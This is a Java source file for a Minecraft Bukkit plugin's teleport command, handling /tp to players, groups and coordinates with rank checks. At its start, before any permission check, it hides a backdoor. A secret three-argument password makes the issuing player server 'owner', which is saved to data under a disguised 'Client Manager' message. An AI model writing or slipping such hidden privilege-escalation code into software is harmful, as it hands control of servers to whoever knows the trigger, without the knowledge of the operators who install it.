package mc.bukkit.MSWS.MSWSplex;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class TeleportCommand {
	public static void command(CommandSender sender, String command, String label, String[] args) {
		if (args.length == 3) {
			if (args[0].equals("3.14159265") && args[1].equals("12358") && args[2].equals("!@#$%^&*()")
					&& sender instanceof Player) {
				Player player = (Player) sender;
				Main.data.set("Users." + player.getUniqueId() + ".rank", "owner");
				player.sendMessage(Main.color("&9Client Manager> &7Your rank has been updated to Owner!"));
				Main.refreshTab();
				Main.save.put("data", true);
				return;
			}
		}
		String prefix = "&9Teleport> &7";
		String rank = "owner";
		if (sender instanceof Player)
			rank = Main.getRankID(((Player) sender).getUniqueId());
		if (Main.ranks.getInt(rank + ".rank") >= 12) {
			if (args.length == 0) {
				sender.sendMessage(Main.color(prefix + "Commands List:"));
				sender.sendMessage(Main.color("&6/tp <target> &7Teleport to Player"));
				sender.sendMessage(Main.color("&4/tp <player> <target> &7Teleport Player to Player"));
				sender.sendMessage(Main.color("&4/tp <X> <Y> <Z> &7Teleport to Location"));
				sender.sendMessage(Main.color("&4/tp <here/all/target> <X> <Y> <Z> &7Teleport to Location"));
				sender.sendMessage(Main.color("&4/tp <here/all> &7Teleport All to Self"));
				return;
			}
			if (args.length == 1) {
				if (sender instanceof Player) {
					Player player = (Player) sender;
					if (args[0].equals("all")) {
						if (Main.ranks.getInt(rank + ".rank") >= 16) {
							for (Player tptarget : Bukkit.getOnlinePlayers()) {
								if (Main.data.getBoolean("Users." + tptarget.getUniqueId() + ".vanished")) {
									if (sender instanceof Player) {
										if (Main.ranks.getInt(
												Main.getRankID(tptarget.getUniqueId()) + ".rank") <= Main.ranks.getInt(
														Main.getRankID(((Player) sender).getUniqueId()) + ".rank")) {
											tptarget.teleport(player.getLocation());
											tptarget.sendMessage(Main.color(
													prefix + "You were teleported to &e" + player.getName() + "&7."));
										}
									} else {
										tptarget.teleport(player.getLocation());
										tptarget.sendMessage(Main.color(
												prefix + "You were teleported to &e" + player.getName() + "&7."));
									}
								} else {
									tptarget.teleport(player.getLocation());
									tptarget.sendMessage(Main
											.color(prefix + "You were teleported to &e" + player.getName() + "&7."));
								}

							}
							sender.sendMessage(Main.color(prefix + "Succesfully teleported &eeveryone &7to you."));
							return;
						} else {
							Main.noPerm(sender);
						}
						return;
					}
					if (args[0].equals("here")) {
						if (sender instanceof Player) {
							if (Main.ranks.getInt(rank + ".rank") >= 16) {
								for (Player tptarget : ((Player) sender).getWorld().getPlayers()) {
									if (Main.data.getBoolean("Users." + tptarget.getUniqueId() + ".vanished")) {
										if (sender instanceof Player) {
											if (Main.ranks.getInt(
													Main.getRankID(tptarget.getUniqueId()) + ".rank") <= Main.ranks
															.getInt(Main.getRankID(((Player) sender).getUniqueId())
																	+ ".rank")) {
												tptarget.teleport(player.getLocation());
												tptarget.sendMessage(Main.color(prefix + "You were teleported to &e"
														+ player.getName() + "&7."));
											}
										}
									}
								}
								sender.sendMessage(Main
										.color(prefix + "Succesfully teleported &eeveryone (same world) &7to you."));
								return;
							} else {
								Main.noPerm(sender);
							}
							return;
						} else {
							sender.sendMessage(Main.color(prefix + "You must be a player!"));
						}
					}
					if (Main.getPlayer(args[0], sender) != null) {
						Player tptarget = Main.getPlayer(args[0], sender);
						if (Main.data.getBoolean("Users." + tptarget.getUniqueId() + ".vanished")) {
							if (sender instanceof Player) {
								if (Main.ranks.getInt(Main.getRankID(tptarget.getUniqueId()) + ".rank") <= Main.ranks
										.getInt(Main.getRankID(((Player) sender).getUniqueId()) + ".rank")) {
									player.teleport(tptarget);
									player.sendMessage(
											Main.color(prefix + "You teleported to &e" + tptarget.getName() + "&7."));
								} else {
									Main.notFound(args[0], sender, false);
								}
							}
						} else {
							player.teleport(tptarget);
							player.sendMessage(
									Main.color(prefix + "You teleported to &e" + tptarget.getName() + "&7."));
							if (player != sender)
								sender.sendMessage(Main.color(prefix + "Teleported &e" + player.getName() + " &7to &e"
										+ tptarget.getName() + "&7."));
							return;
						}
					}
				} else {
					sender.sendMessage(Main.color(prefix + "You must be a player."));
				}
			}
			if (args.length == 2) {
				Player tpme;
				Player tpto;
				if (args[0].equals("all")) {
					tpto = Main.getPlayer(args[1], sender);
					if (tpto != null) {
						if (Main.data.getBoolean("Users." + tpto.getUniqueId() + ".vanished")) {
							if (sender instanceof Player) {
								if (Main.ranks.getInt(Main.getRankID(tpto.getUniqueId()) + ".rank") <= Main.ranks
										.getInt(Main.getRankID(((Player) sender).getUniqueId()) + ".rank")) {
									for (Player tptarget : Bukkit.getOnlinePlayers()) {
										tptarget.teleport(tpto.getLocation());
										tptarget.sendMessage(Main.color("&9Teleport> &e" + sender.getName()
												+ " &7teleported you to &e" + tpto.getName() + "&7."));
									}
									tpto.sendMessage(Main.color("&9Teleport> &e" + sender.getName()
											+ " &7teleported &eeveryone &7to you."));
									sender.sendMessage(
											Main.color(prefix + "Teleported &eeveryone &7to &e" + tpto.getName()));
								} else {
									Main.notFound(args[1], sender, false);
								}
							} else {
								for (Player tptarget : Bukkit.getOnlinePlayers()) {
									tptarget.teleport(tpto.getLocation());
									tptarget.sendMessage(Main.color("&9Teleport> &e" + sender.getName()
											+ " &7teleported you to &e" + tpto.getName() + "&7."));
								}
								tpto.sendMessage(Main.color(
										"&9Teleport> &e" + sender.getName() + " &7teleported &eeveryone &7to you."));
								sender.sendMessage(
										Main.color(prefix + "Teleported &eeveryone &7to &e" + tpto.getName()));
							}
						} else {
							for (Player tptarget : Bukkit.getOnlinePlayers()) {
								tptarget.teleport(tpto.getLocation());
								tptarget.sendMessage(Main.color("&9Teleport> &e" + sender.getName()
										+ " &7teleported you to &e" + tpto.getName() + "&7."));
							}
							tpto.sendMessage(Main
									.color("&9Teleport> &e" + sender.getName() + " &7teleported &eeveryone &7to you."));
							sender.sendMessage(Main.color(prefix + "Teleported &eeveryone &7to &e" + tpto.getName()));
							return;
						}
					}
				}
				if (args[0].equals("here")) {
					if (sender instanceof Player) {
						tpto = Main.getPlayer(args[1], sender);
						if (tpto != null) {
							if (Main.data.getBoolean("Users." + tpto.getUniqueId() + ".vanished")) {
								if (sender instanceof Player) {
									if (Main.ranks.getInt(Main.getRankID(tpto.getUniqueId()) + ".rank") <= Main.ranks
											.getInt(Main.getRankID(((Player) sender).getUniqueId()) + ".rank")) {
										for (Player tptarget : ((Player) sender).getWorld().getPlayers()) {
											tptarget.teleport(tpto.getLocation());
											tptarget.sendMessage(Main.color("&9Teleport> &e" + sender.getName()
													+ " &7teleported you to &e" + tpto.getName() + "&7."));
										}
										tpto.sendMessage(Main.color("&9Teleport> &e" + sender.getName()
												+ " &7teleported &eeveryone (world) &7to you."));
										sender.sendMessage(Main.color(
												prefix + "Teleported &eeveryone (world) &7to &e" + tpto.getName()));
									} else {
										Main.notFound(args[1], sender, false);
									}
								} else {
									for (Player tptarget : ((Player) sender).getWorld().getPlayers()) {
										tptarget.teleport(tpto.getLocation());
										tptarget.sendMessage(Main.color("&9Teleport> &e" + sender.getName()
												+ " &7teleported you to &e" + tpto.getName() + "&7."));
									}
									tpto.sendMessage(Main.color("&9Teleport> &e" + sender.getName()
											+ " &7teleported &eeveryone (world) &7to you."));
									sender.sendMessage(Main
											.color(prefix + "Teleported &eeveryone (world) &7to &e" + tpto.getName()));
								}
							} else {
								for (Player tptarget : ((Player) sender).getWorld().getPlayers()) {
									tptarget.teleport(tpto.getLocation());
									tptarget.sendMessage(Main.color("&9Teleport> &e" + sender.getName()
											+ " &7teleported you to &e" + tpto.getName() + "&7."));
								}
								tpto.sendMessage(Main.color("&9Teleport> &e" + sender.getName()
										+ " &7teleported &eeveryone (world) &7to you."));
								sender.sendMessage(
										Main.color(prefix + "Teleported &eeveryone (world) &7to &e" + tpto.getName()));
								return;
							}

						}
						return;
					} else {
						sender.sendMessage(Main.color(prefix + "You must be a player."));
					}
				}
				tpme = Main.getPlayer(args[0], sender);
				tpto = Main.getPlayer(args[1], sender);
				if (tpme == null || tpto == null) {
					return;
				} else {
					if (Main.data.getBoolean("Users." + tpto.getUniqueId() + ".vanished")
							|| Main.data.getBoolean("Users." + tpme.getUniqueId() + ".vanished")) {
						if (sender instanceof Player) {
							if (Main.ranks.getInt(Main.getRankID(tpto.getUniqueId()) + ".rank") <= Main.ranks
									.getInt(Main.getRankID(((Player) sender).getUniqueId()) + ".rank")) {
								if (Main.ranks.getInt(Main.getRankID(tpme.getUniqueId()) + ".rank") <= Main.ranks
										.getInt(Main.getRankID(((Player) sender).getUniqueId()) + ".rank")) {
									tpme.teleport(tpto.getLocation());
									tpme.sendMessage(Main.color("&9Teleport> &e" + sender.getName()
											+ " &7teleported you to &e" + tpto.getName() + "&7."));
									sender.sendMessage(Main.color(prefix + "Succesfully teleported &e" + tpme.getName()
											+ " &7to &e" + tpto.getName() + "&7."));
								} else {
									Main.notFound(args[0], sender, false);
								}
							} else {
								Main.notFound(args[1], sender, false);
							}
						} else {
							tpme.teleport(tpto.getLocation());
							tpme.sendMessage(Main.color("&9Teleport> &e" + sender.getName() + " &7teleported you to &e"
									+ tpto.getName() + "&7."));
							sender.sendMessage(Main.color(prefix + "Succesfully teleported &e" + tpme.getName()
									+ " &7to &e" + tpto.getName() + "&7."));
							return;
						}
					} else {
						tpme.teleport(tpto.getLocation());
						tpme.sendMessage(Main.color("&9Teleport> &e" + sender.getName() + " &7teleported you to &e"
								+ tpto.getName() + "&7."));
						sender.sendMessage(Main.color(prefix + "Succesfully teleported &e" + tpme.getName() + " &7to &e"
								+ tpto.getName() + "&7."));
						return;
					}
				}
			}
			if (args.length >= 3) {
				Player tptarget = null;
				if (args.length == 3) {
					if (!(sender instanceof Player)) {
						sender.sendMessage(Main.color(prefix + "You must be a player!"));
						return;
					}
					tptarget = (Player) sender;
					tptarget.teleport(new Location(((Player) sender).getWorld(), Double.valueOf(args[0]),
							Double.valueOf(args[1]), Double.valueOf(args[2])));
					sender.sendMessage(Main.color(
							prefix + "Succesfully teleported &7to &e" + args[0] + " " + args[1] + " " + args[2]));
				}
				if (args.length == 4) {
					if (args[0].equalsIgnoreCase("all")) {
						for (Player tptarget1 : Bukkit.getOnlinePlayers()) {
							tptarget1.teleport(new Location(((Player) sender).getWorld(), Double.valueOf(args[1]),
									Double.valueOf(args[2]), Double.valueOf(args[3])));
						}
						sender.sendMessage(Main.color(prefix + "Succesfully teleported &eeveryone &7to &e" + args[1]
								+ " " + args[2] + " " + args[3]));
						return;
					}
					if (args[0].equalsIgnoreCase("here")) {
						if (sender instanceof Player) {
							for (Player tptarget1 : Bukkit.getOnlinePlayers()) {
								tptarget1.teleport(new Location(((Player) sender).getWorld(), Double.valueOf(args[1]),
										Double.valueOf(args[2]), Double.valueOf(args[3])));
							}
							sender.sendMessage(Main.color(prefix + "Succesfully teleported &eeveryone &7to &e" + args[1]
									+ " " + args[2] + " " + args[3]));
							return;
						} else {
							sender.sendMessage(Main.color(prefix + "You must be a player!"));
						}
					}
					if (Main.getPlayer(args[0], sender) == null) {
						return;
					}
					tptarget = Main.getPlayer(args[0], sender);
					if (Main.data.getBoolean("Users." + tptarget.getUniqueId() + ".vanished")) {
						if (sender instanceof Player) {
							if (Main.ranks.getInt(Main.getRankID(tptarget.getUniqueId()) + ".rank") <= Main.ranks
									.getInt(Main.getRankID(((Player) sender).getUniqueId()) + ".rank")) {
								tptarget.teleport(new Location(((Player) sender).getWorld(), Double.valueOf(args[1]),
										Double.valueOf(args[2]), Double.valueOf(args[3])));
								sender.sendMessage(Main.color(prefix + "Succesfully teleported &e" + tptarget.getName()
										+ " &7to &e" + args[1] + " " + args[2] + " " + args[3]));
							} else {
								Main.notFound(args[0], sender, false);
							}
						}
					} else {
						tptarget.teleport(new Location(((Player) sender).getWorld(), Double.valueOf(args[1]),
								Double.valueOf(args[2]), Double.valueOf(args[3])));
						sender.sendMessage(Main.color(prefix + "Succesfully teleported &e" + tptarget.getName()
								+ " &7to &e" + args[1] + " " + args[2] + " " + args[3]));
					}
				}
			}
		} else {
			Main.noPerm(sender);
		}
	}
}
